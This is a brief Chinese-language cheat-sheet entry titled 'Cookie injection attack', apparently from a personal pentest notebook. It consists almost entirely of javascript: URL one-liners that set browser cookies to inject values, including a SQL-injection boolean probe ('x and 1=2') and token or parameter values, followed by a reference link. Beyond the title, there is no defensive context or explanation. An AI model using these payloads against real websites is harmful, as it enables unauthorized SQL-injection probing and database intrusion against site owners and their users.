# Cookie注入攻击

```javascript
javascript:alert(document.cookie="id="+escape("x and 1=2"));

javascript:alert(document.cookie="smallclass="+escape("148"));
javascript:alert(document.cookie="x-access-token="+escape("148"));

javascript:alert(document.cookie="smallclass="+escape("7d2pqi7kui9lca3vkkds4v1j9m210n78"));

```

[参考](https://www.cnblogs.com/zlgxzswjy/p/6443767.html)
